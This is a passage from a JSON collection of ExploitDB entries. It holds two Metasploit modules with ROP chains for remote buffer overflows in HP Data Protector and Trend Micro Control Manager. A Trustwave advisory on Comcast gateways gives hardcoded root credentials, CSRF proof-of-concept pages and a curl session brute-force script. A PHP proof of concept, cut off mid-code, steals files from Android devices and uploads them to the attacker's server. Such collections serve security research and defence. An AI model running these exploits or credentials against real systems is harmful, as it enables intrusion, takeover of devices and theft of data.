                "code": "##\r\n# $Id: hp_omniinet_4.rb 13096 2011-07-04 22:33:47Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => \"HP OmniInet.exe Opcode 20 Buffer Overflow\",\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a vulnerability found in HP Data Protector's OmniInet\r\n\t\t\t\tprocess.  By supplying a long string of data as the file path with opcode '20',\r\n\t\t\t\ta buffer overflow can occur when this data is being written on the stack where\r\n\t\t\t\tno proper bounds checking is done beforehand, which results arbitrary code\r\n\t\t\t\texecution under the context of SYSTEM.  This module is also made against systems\r\n\t\t\t\tsuch as Windows Server 2003 or Windows Server 2008 that have DEP and/or ASLR\r\n\t\t\t\tenabled by default.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => \"$Revision: 13096 $\",\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Oren Isacson',  #Initial discovery, poc\r\n\t\t\t\t\t'muts',          #Initial poc of the ROP exploit w/ dookie\r\n\t\t\t\t\t'dookie',        #Initial poc of the ROP exploit w/ muts\r\n\t\t\t\t\t'sinn3r',        #MSF module with corelanc0d3r  (Also Thx to MC and HD)\r\n\t\t\t\t\t'corelanc0d3r',  #MSF module with sinn3r\r\n\t\t\t\t],\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2011-1865' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.exploit-db.com/exploits/17468/' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities' ],\r\n\t\t\t\t\t[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182' ],\r\n\t\t\t\t],\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars'        => \"\\x00\",\r\n\t\t\t\t\t'PrependEncoder'  => \"\\x66\\x81\\xc4\\xb8\\x0b\\x61\\x9d\", #add sp, 0xb88; popad; popfd\r\n\t\t\t\t},\r\n\t\t\t'DefaultOptions'  =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'ExitFunction' => \"process\",\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t#If 'Max' gets too long (ie. 10000 bytes), we can get a busted heap\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on XP SP3 or Win Server 2003',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Offset' => 2005,       #For overwriting a RETN (6481 for SEH)\r\n\t\t\t\t\t\t\t'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\r\n\t\t\t\t\t\t\t'Max'    => 5000,\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on Win Server 2008',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Offset' => 1993,       #For overwriting a RETN (6481 for SEH)\r\n\t\t\t\t\t\t\t'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\r\n\t\t\t\t\t\t\t'Max'    => 5000,\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => \"Jun 29 2011\",\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\t\tregister_options([Opt::RPORT(5555)], self.class)\r\n\tend\r\n\r\n\tdef nop\r\n\t\treturn make_nops(4).unpack(\"L\")[0].to_i\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\tconnect\r\n\r\n\t\t#mona.py tekniq\r\n\t\t#https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/\r\n\t\trop = [\r\n\t\t\t#Initial setup\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t0x7C342629,  # SLIDE\r\n\t\t\t#ROP begins here\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c37a140,  # Make EAX readable\r\n\t\t\t0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)\r\n\t\t\tnop,         # EBP\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c37a140,  # <- VirtualProtect() found in IAT\r\n\t\t\t0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)\r\n\t\t\t0x7c346c0b,  # Slide, so next gadget would write to correct stack location\r\n\t\t\t0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)\r\n\t\t\tnop,         # EDI (filler)\r\n\t\t\tnop,         # will be patched at runtime (VP), then picked up into ESI\r\n\t\t\tnop,         # EBX (filler)\r\n\t\t\t0x7c376402,  # POP EBP # RETN (msvcr71.dll)\r\n\t\t\t0x7c345c30,  # ptr to push esp #  ret  (from MSVCR71.dll)\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0xfffff82f,  # size 20001 bytes\r\n\t\t\t0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c354901,  # POP EBX # RETN (MSVCR71.dll)\r\n\t\t\t0xffffffff,  # pop value into ebx\r\n\t\t\t0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)\r\n\t\t\t0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)\r\n\t\t\t0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)\r\n\t\t\t0x7c34b8d8,  # ROP NOP (-> edi)\r\n\t\t\t0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)\r\n\t\t\t0xffffffc0,  # value to negate, target value : 0x00000040, target: edx\r\n\t\t\t0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x90909090,  # NOPS (-> eax)\r\n\t\t\t0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)\r\n\t\t].pack('V*')\r\n\r\n\t\t#Overflowing path \"C:\\Program Files\\OmniBack\\bin\\\"\r\n\t\t#4807 bytes after target.ret, but we need to use less than that to avoid a busted heap\r\n\t\tsploit = ''\r\n\t\tsploit << rand_text_alpha(target['Offset']-sploit.length)\r\n\t\tsploit << [target.ret].pack('V*')\r\n\t\tsploit << rop\r\n\t\tsploit << payload.encoded\r\n\t\tsploit << rand_text_alpha(target['Max']-sploit.length)\r\n\r\n\t\tpkt  = ''\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x00\")\r\n\t\tpkt << \"\\x41\\x41\"  #Length field place holder\r\n\t\tpkt << \"\\xff\\xfe\"\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x32\\x00\")\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 5)\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x20\")\r\n\t\tpkt << Rex::Text.to_unicode(\"20\")  #Opcode\r\n\t\tpkt << \"\\x00\"\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 7)\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x20\\x00\")\r\n\t\tpkt << sploit\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x00\")\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 16)\r\n\r\n\t\t#pkt length\r\n\t\tpkt[2,2] = [pkt.length-5].pack('n')\r\n\r\n\t\tprint_status(\"Sending packet to #{datastore['RHOST']}...\")\r\n\t\tsock.put(pkt)\r\n\r\n\t\t#Data Protector lags before triggering the vuln code\r\n\t\t#Long delay seems necessary to ensure we get a shell back\r\n\t\tselect(nil,nil,nil,20)\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\nend",
                "description": "HP OmniInet.exe Opcode 20 - Remote Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 17490,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-07-04T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => \"TrendMicro Control Manger <= v5.5 CmdProcessor.exe Stack Buffer Overflow\",\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a vulnerability in the CmdProcessor.exe component of Trend\r\n\t\t\t\tMicro Control Manger up to version 5.5.\r\n\r\n\t\t\t\t\tThe specific flaw exists within CmdProcessor.exe service running on TCP port\r\n\t\t\t\t20101. The vulnerable function is the CGenericScheduler::AddTask function of\r\n\t\t\t\tcmdHandlerRedAlertController.dll. When processing a specially crafted IPC packet,\r\n\t\t\t\tcontrolled data is copied into a 256-byte stack buffer. This can be exploited\r\n\t\t\t\tto execute remote code under the context of the user.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Luigi Auriemma',  #Initial discovery\r\n\t\t\t\t\t'Blue',            #Metasploit\r\n\t\t\t\t],\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t['CVE', '2011-5001'],\r\n\t\t\t\t\t['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-345/']\r\n\t\t\t\t],\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars' => \"\\x00\",\r\n\t\t\t\t},\r\n\t\t\t'DefaultOptions'  =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'ExitFunction' => 'process',\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t# TCM 5.5 cannot be installed in Win2k3 SP0-SP1, Win2k8, or XP\r\n\t\t\t\t\t\t'Windows 2003 Server SP2 (DEP Bypass)',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'    => 0x666b34c8, # TMNotify.dll stack pivot\r\n\t\t\t\t\t\t\t'Offset' => 5000\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => \"Dec 07 2011\",\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOpt::RPORT(20101)\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\tdef junk\r\n\t\treturn rand_text(4).unpack(\"L\")[0].to_i\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\t#TmUpdate.dll\r\n\t\trop_chain = [\r\n\t\t\t0x668074d4,\t# POP EDX # OR AL,0F6 # RETN\r\n\t\t\t0x3FCD0FFC,\t# Put 00001000 into edx\r\n\t\t\t0x667611b2,\t# ADD EDX,C0330004 # RETN 04\r\n\t\t\t0x667c99e7,\t# POP EBP # RETN [TmUpdate.dll]\r\n\t\t\tjunk,\r\n\t\t\t0x667c99e7,\t# skip 4 bytes [TmUpdate.dll]\r\n\t\t\t0x667e3250,\t# POP EBX # RETN [TmUpdate.dll]\r\n\t\t\t0xffffffff,\t# NEG EBX\r\n\t\t\t0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6680a1d3,\t# POP EAX # RETN [TmUpdate.dll]\r\n\t\t\t0xffffffc0,\t# Value to negate, will become 0x00000040\r\n\t\t\t0x66812b53,\t# NEG EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x667f030a,\t# MOV ECX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x667d4c7c,\t# POP EDI # RETN [TmUpdate.dll]\r\n\t\t\t0x667e8003,\t# RETN (ROP NOP) [TmUpdate.dll]\r\n\t\t\t0x667d54d0,\t# POP ESI # RETN [TmUpdate.dll]\r\n\t\t\t0x667baf06,\t# JMP [EAX] [TmUpdate.dll]\r\n\t\t\t0x66833376,\t# POP EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6686115c,\t# ptr to &VirtualAlloc() [IAT TmUpdate.dll]\r\n\t\t\t0x6681ceb3,\t# PUSHAD # RETN [TmUpdate.dll]\r\n\t\t\t0x668382c3,\t# ptr to 'call esp' [TmUpdate.dll]\r\n\t\t].pack('V*')\r\n\t\t#rop chain generated by mona.py\r\n\r\n\t\theader  = \"\\x00\\x00\"\r\n\t\theader << \"\\x13\\x88\"          #size of buffer\r\n\t\theader << rand_text_alpha(9)\r\n\t\theader << \"\\x15\\x09\\x13\"      #opcode\r\n\t\theader << \"\\x00\\x00\\x00\"\r\n\t\theader << rand_text_alpha(25)\r\n\t\theader << \"\\xFE\\xFF\\xFF\\xFF\"  #in instruction #MOV EDI,DWORD PTR DS:[EAX+ECX] #ECX is our buffer and needs to be readable dword\r\n\t\theader << \"\\xFF\\xFF\\xFF\\xFF\"  #after sum with EAX. Pointer from EAX increments by #LEA EAX,DWORD PTR DS:[EAX+EDI+4] and then is saved\r\n\t\theader << \"\\xFF\\xFF\\xF4\\xFF\"  #and used again. We can essentially walk the loop which increments EBX by 1 until we get to 14 which leads\r\n\t\theader << \"\\xFF\\xFF\"          #us to our vulnerable function\r\n\t\theader << rand_text_alpha(1)  #align stack again for rop\r\n\r\n\t\tpay = rop_chain\r\n\t\tpay << make_nops(374 - rop_chain.length)\r\n\t\tpay << \"\\xeb\\x04\"  #Short jmp 0x04\r\n\t\tpay << [target.ret].pack('V')\r\n\t\tpay << payload.encoded\r\n\r\n\t\tsploit = header\r\n\t\tsploit << pay\r\n\r\n\t\tfiller = rand_text_alpha(target['Offset'] - (sploit.length))\r\n\r\n\t\tconnect\r\n\t\tprint_status(\"Sending request...\")\r\n\t\tsock.put(sploit + filler)\r\n\t\thandler\r\n\t\tdisconnect\r\n\r\n\tend\r\n\r\nend",
                "description": "Trend Micro Control Manger 5.5 - 'CmdProcessor.exe' Remote Stack Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 18514,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2012-02-23T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "Trustwave's SpiderLabs Security Advisory TWSL2011-002:\r\nVulnerabilities in Comcast DOCSIS 3.0 Business Gateways\r\n(D3G-CCR)\r\n\r\nhttps://www.trustwave.com/spiderlabs/advisories/TWSL2011-002.txt\r\n\r\nPublished: 2011-02-04\r\nVersion: 1.0\r\n\r\nVendor: Comcast (http://comcast.com)\r\nProduct: Comcast DOCSIS 3.0 Business Gateway - D3G-CCR\r\nVersion affected:  Versions prior to 1.4.0.49.2\r\n\r\nProduct description:\r\nThe Comcast DOCSIS 3.0 Business Gateway provides end-user termination of\r\ncable internet services for Comcast Business Class customers with enhanced\r\nservices including Network Address Translation (NAT), firewalling, and\r\nVirtual Private Network (VPN) termination.\r\n\r\nCredit: Zack Fasel and Matthew Jakubowski of Trustwave's SpiderLabs\r\n\r\nFinding 1: Static Credentials\r\nCVE: CVE-2011-0885\r\n\r\nAll D3G-CCR gateways provided by Comcast have an administrative\r\nlogin of \"mso\" with the password of \"D0nt4g3tme\".  These passwords\r\nare not provided as a part of the installation of the device and are\r\nnot recommended to be changed, thus the majority of users are unaware\r\nof the default configuration.\r\n\r\nWith these default credentials, internal attackers can modify device\r\nconfigurations to leverage more significant attacks, including redirection\r\nof DNS requests, creation of a remote VPN termination point, and\r\nmodification of NAT entries.  These credentials provide access to the web\r\ninterface for management, as well as a telnet interface that provides shell\r\naccess to the device.  The mso login provides shell as UID 0 (root).\r\n\r\n\r\nFinding 2: Cross Site Request Forgery (CSRF)\r\nCVE: CVE-2011-0886\r\nD3G-CCR gateways provided by Comcast permit CSRF attacks against\r\nnumerous management pages allowing an attacker to embed in a webpage a\r\nmalicious request against the gateway's management interface.  Through\r\nthis, an attacker can modify device configuration and enable remote\r\nadministration via a telnet shell and http.\r\n\r\nThe following Proof of Concept (PoC) connects to the gateway, logs in,\r\nmodifies the remote administration to allow any user to connect externally,\r\nand modifies the DNS information.\r\n\r\n## d3g-csrf-poc.htm\r\n\r\n<html>\r\n<body>\r\n<iframe src=\"./d3g-csrf-poc-1.htm\" width=\"1\" height=\"1\">\r\n</iframe>\r\n<iframe src=\"./d3g-csrf-poc-2.htm\" width=\"1\" height=\"1\">\r\n</iframe>\r\n<iframe src=\"./d3g-csrf-poc-3.htm\" width=\"1\" height=\"1\">\r\n</iframe> </body> </html>\r\n\r\n## d3g-csrf-poc-1.htm\r\n\r\n<html>\r\n<body>\r\n<form action=\"http://10.1.10.1/goform/login\" method=\"post\"\r\n\tname=\"tF\">\r\n<input type=\"hidden\" name=\"user\" value=\"mso\" />\r\n<input type=\"hidden\" name=\"pws\" value=\"D0nt4g3tme\" />\r\n</form> <script> document.tF.submit(); </script> </body>\r\n</html>\r\n\r\n## d3g-csrf-poc-2.htm\r\n\r\n<html>\r\n<body>\r\n<form action=\"http://10.1.10.1/goform/RemoteRange\"\r\nname=\"RMangement\" method=\"post\"> <input type=\"hidden\"\r\nvalue=\"feat-admin-remote\" name=\"file\"> <input type=\"hidden\"\r\nvalue=\"admin/\" name=\"dir\"> <input type=\"hidden\"\r\nname=\"RemoteRange\" value=\"0\" /> <input type=\"hidden\"\r\nname=\"rm_access\" value=\"on\" /> <input type=\"hidden\"\r\nname=\"Remote0\" value=\"0.0.0.0,0.0.0.0,1\" /> <input\r\ntype=\"hidden\" name=\"http_port\" value=\"8080\" /> <input\r\ntype=\"hidden\" name=\"http_enable\" value=\"on\" /> <input\r\ntype=\"hidden\" name=\"http_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"msoremote_enableCheck\" value=\"on\" />\r\n<input type=\"hidden\" name=\"mso_remote_enable\" value=\"1\" />\r\n<input type=\"hidden\" name=\"remote_enable\" value=\"0\" />\r\n<input type=\"hidden\" name=\"https_enable\" value=\"on\" />\r\n<input type=\"hidden\" name=\"https_port\" value=\"8181\" />\r\n<input type=\"hidden\" name=\"https_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"telnet_enable\" value=\"on\" /> <input\r\ntype=\"hidden\" name=\"telnet_port\" value=\"2323\" /> <input\r\ntype=\"hidden\" name=\"telnet_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"Remote1=\" value=\"\" /> </form> </body>\r\n</html> <script>\r\nsetTimeout(\"document.RMangement.submit()\",4000);\r\n</script>\r\n</body>\r\n</html>\r\n\r\n## d3g-csrf-poc-3.htm\r\n\r\n<html>\r\n<body>\r\n<form name=\"WanIPform\"\r\naction=\"http://10.1.10.1/goform/Basic\" method=\"post\"> <input\r\ntype=\"hidden\" value=\"feat-wan-ip\" name=\"file\"> <input\r\ntype=\"hidden\" value=\"admin/\" name=\"dir\"> <input\r\ntype=\"hidden\" value=\"Fixed\" name=\"DNSAssign\"> <input\r\ntype=\"hidden\" value=\"0\" name=\"dhcpc_release\"> <input\r\ntype=\"hidden\" value=\"0\" name=\"dhcpc_renew\"> <input\r\ntype=\"hidden\" value=\"\" name=\"domain_name\"> <input\r\ntype=\"hidden\" value=\"\" name=\"WDn\"> <input type=\"hidden\"\r\nname=\"SysName\" value=\"\" /> <input type=\"hidden\"\r\nname=\"manual_dns_enable\" value=\"on\" /> <input type=\"hidden\"\r\nname=\"DAddr\" value=\"4.2.2.1\" /> <input type=\"hidden\"\r\nname=\"DAddr0\" value=\"4\" /> <input type=\"hidden\"\r\nname=\"DAddr1\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"DAddr2\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"DAddr3\" value=\"1\" /> <input type=\"hidden\"\r\nname=\"PDAddr\" value=\"4.2.2.2\" /> <input type=\"hidden\"\r\nname=\"PDAddr0\" value=\"4\" /> <input type=\"hidden\"\r\nname=\"PDAddr1\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"PDAddr2\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"PDAddr3\" value=\"2\" /> </form> <script>\r\nsetTimeout(\"document.WanIPform.submit()\",5000);\r\n</script>\r\n</body>\r\n</html>\r\n\r\nIf the PoC was embedded in any web page the targeted user visited while\r\nlogged into the device, the attacker would be provided remote\r\nadministration in to the gateway device include a telnet shell.  This would\r\nallow the attacker to redirect traffic to a malicious end-point.\r\n\r\n\r\nFinding 3: Weak Session Management \r\nCVE: CVE-2011-0887\r\nD3G-CCR gateways provided by Comcast utilize a predictable value to\r\nvalidate the active web management portal session.  The epoch time of\r\nbeginning of the session is stored as a cookie labeled \"userid\".  This\r\nprovides a predictable range of session IDs that can be brute-forced.\r\n\r\nThe following PoC attempts to brute force the session IDs by requesting the\r\nadmin page with an incrementing cookie and determining whether it wants to\r\nredirect to login.asp.\r\n\r\n## d3g-session-poc.sh\r\n\r\n#!/bin/bash\r\nstart=1267604160\r\nend=1267605960\r\nfor (( i=$start; i<=$end; i++)) do if [ `curl -sb userid=$i\r\nhttp://10.1.10.1/admin/index.asp | grep -c login.asp` -lt\r\n\"1\" ] then echo \"Session ID Found:  $i\"\r\nfi\r\nif [ $(($i % 100)) -eq \"0\" ]\r\nthen echo \"Currently at $i\"\r\nfi\r\ndone\r\n\r\nThrough this, an attacker can brute-force the possible valid session IDs.\r\nSessions do by default expire within 10 minutes, thus the attack window is\r\nlimited but can be leveraged with other attack methods.\r\n\r\n\r\nVendor Response:\r\nThese issues have been addressed as of version 1.4.0.49.2\r\n\r\nRemediation Steps:\r\nIn order to determine if the correct version is installed, users should\r\nview the \"About\" link in the management interface. Versions 1.4.0.49.2 and\r\nabove have been corrected.\r\n\r\nVendor Communication Timeline:\r\n08/30/10 - Vulnerability disclosed\r\n01/21/11 - Patch Released\r\n02/04/11 - Advisory Published\r\n\r\nRevision History:\r\n1.0 Initial publication\r\n\r\n\r\nAbout Trustwave:\r\nTrustwave is the leading provider of on-demand and subscription-based\r\ninformation security and payment card industry compliance management\r\nsolutions to businesses and government entities throughout the world. For\r\norganizations faced with today's challenging data security and compliance\r\nenvironment, Trustwave provides a unique approach with comprehensive\r\nsolutions that include its flagship TrustKeeper compliance management\r\nsoftware and other proprietary security solutions. Trustwave has helped\r\nthousands of organizations--ranging from Fortune 500 businesses and large\r\nfinancial institutions to small and medium-sized retailers--manage\r\ncompliance and secure their network infrastructure, data communications and\r\ncritical information assets. Trustwave is headquartered in Chicago with\r\noffices throughout North America, South America, Europe, Africa, China and\r\nAustralia. For more information, visit https://www.trustwave.com\r\n\r\nAbout Trustwave's SpiderLabs:\r\nSpiderLabs(R) is the advanced security team at Trustwave focused on\r\napplication security, incident response, penetration testing, physical\r\nsecurity and security research. The team has performed over a thousand\r\nincident investigations, thousands of penetration tests and hundreds of\r\napplication security tests globally. In addition, the SpiderLabs Research\r\nteam provides intelligence through bleeding-edge research and proof of\r\nconcept tool development to enhance Trustwave's products and services.\r\nhttps://www.trustwave.com/spiderlabs\r\n\r\nDisclaimer:\r\nThe information provided in this advisory is provided \"as is\" without\r\nwarranty of any kind. Trustwave disclaims all warranties, either express or\r\nimplied, including the warranties of merchantability and fitness for a\r\nparticular purpose. In no event shall Trustwave or its suppliers be liable\r\nfor any damages whatsoever including direct, indirect, incidental,\r\nconsequential, loss of business profits or special damages, even if\r\nTrustwave or its suppliers have been advised of the possibility of such\r\ndamages. Some states do not allow the exclusion or limitation of liability\r\nfor consequential or incidental damages so the foregoing limitation may not\r\napply.",
                "description": "Comcast DOCSIS 3.0 Business Gateways - Multiple Vulnerabilities",
                "author": "Trustwave's SpiderLabs",
                "_id": 16123,
                "source": "ExploitDB",
                "platform": "hardware",
                "date": "2011-02-06T00:00:00+00:00",
                "cve": [
                    "CVE-2011-0885",
                    "CVE-2011-0886",
                    "CVE-2011-0887"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "<?php \r\n/* \r\n* Description:  Android 'content://' URI Multiple Information Disclosure Vulnerabilities\r\n* Bugtraq ID:   48256\r\n* CVE:          CVE-2010-4804\r\n* Affected:     Android < 2.3.4\r\n* Author:       Thomas Cannon\r\n* Discovered:   18-Nov-2010\r\n* Advisory:     http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/\r\n*\r\n* Filename:     poc.php\r\n* Instructions: Specify files you want to upload in filenames array. Host this php file\r\n*               on a server and visit it using the Android Browser. Some builds of Android\r\n*               may require adjustments to the script, for example when a German build was\r\n*               tested it downloaded the payload as .htm instead of .html, even though .html\r\n*               was specified. \r\n*\r\n* Tested on:    HTC Desire (UK Version) with Android 2.2\r\n*/\r\n\r\n//  List of the files on the device that we want to upload to our server\r\n$filenames = array(\"/proc/version\",\"/sdcard/img.jpg\");\r\n\r\n//  Determine the full URL of this script\r\n$protocol = $_SERVER[\"HTTPS\"] == \"on\" ? \"https\" : \"http\";\r\n$scripturl = $protocol.\"://\".$_SERVER[\"HTTP_HOST\"].$_SERVER[\"SCRIPT_NAME\"];\r\n\r\n//  Stage 0:  Display introduction text and a link to start the PoC.\r\nfunction stage0($scripturl) {\r\n  echo \"<b>Android < 2.3.4</b><br>Data Stealing Web Page<br><br>Click: <a href=\\\"$scripturl?stage=1\\\">Malicious Link</a>\";\r\n}\r\n\r\n//  Stage 1:  Redirect to Stage 2 which will force a download of the HTML/JS payload, then a few seconds later redirect \r\n//            to the payload. We load the payload using a Content Provider so that the JavaScript is executed in the\r\n//            context of the local device - this is the vulnerability.\r\nfunction stage1($scripturl) {\r\n  echo \"<body onload=\\\"setTimeout('window.location=\\'$scripturl?stage=2\\'',1000);setTimeout('window.location=\\'content://com.android.htmlfileprovider/sdcard/download/poc.html\\'',5000);\\\">\";\r\n}\r\n\r\n//  Stage 2:  Download of payload, the Android browser doesn't prompt for the download which is another vulnerability.\r\n//            The payload uses AJAX calls to read file contents and encodes as Base64, then uploads to server (Stage 3).\r\nfunction stage2($scripturl,$filenames) {\r\n  header(\"Cache-Control: public\");\r\n  header(\"Content-Description: File Transfer\");\r\n  header(\"Content-Disposition: attachment; filename=poc.html\");\r\n  header(\"Content-Type: text/html\");\r\n  header(\"Content-Transfer-Encoding: binary\");\r\n?>\r\n<html>\r\n  <body>\r\n    <script language='javascript'>\r\n      var filenames = Array('<?php echo implode(\"','\",$filenames); ?>');\r\n      var filecontents = new Array();\r\n      function processBinary(xmlhttp) {\r\n        data = xmlhttp.responseText;    r = '';   size = data.length;\r\n        for(var i = 0; i < size; i++)   r += String.fromCharCode(data.charCodeAt(i) & 0xff);\r\n        return r;\r\n      }\r\n      function getFiles(filenames) {\r\n        for (var filename in filenames) {\r\n          filename = filenames[filename];\r\n          xhr = new XMLHttpRequest();\r\n          xhr.open('GET', filename, false);\r\n          xhr.overrideMimeType('text/plain; charset=x-user-defined');\r\n          xhr.onreadystatechange = function() { if (xhr.readyState == 4) { filecontents[filename] = btoa(processBinary(xhr)); } }\r\n          xhr.send();\r\n        }\r\n      }\r\n      function addField(form, name, value) {\r\n        var fe = document.createElement('input');\r\n        fe.setAttribute('type', 'hidden');\r\n        fe.setAttribute('name', name);\r\n        fe.setAttribute('value', value);\r\n        form.appendChild(fe);\r\n      }\r\n      function uploadFiles(filecontents) {\r\n        var form = document.createElement('form');\r\n        form.setAttribute('method', 'POST');\r\n        form.setAttribute('enctype', 'multipart/form-data');\r\n        form.setAttribute('action', '<?=$scripturl?>?stage=3');\r\n        var i = 0;\r\n        for (var filename in filecontents) {\r\n          addField(form, 'filename'+i, btoa(filename));\r\n          addField(form, 'data'+i, filecontents[filename]);\r\n          i += 1;\r\n        }\r\n        document.body.appendChild(form);\r\n        form.submit();\r\n      }\r\n      getFiles(filenames);\r\n      uploadFiles(filecontents);\r\n    </script>\r\n  </body>\r\n</html>\r\n<?php\r\n}\r\n\r\n//  Stage 3:  Read the file names and contents sent by the payload and write to a file on the server.\r\nfunction stage3() {\r\n  $fp = fopen(\"files.txt\", \"w\") or die(\"Couldn't open file for writing!\");\r\n  fwrite($fp, print_r($_POST, TRUE)) 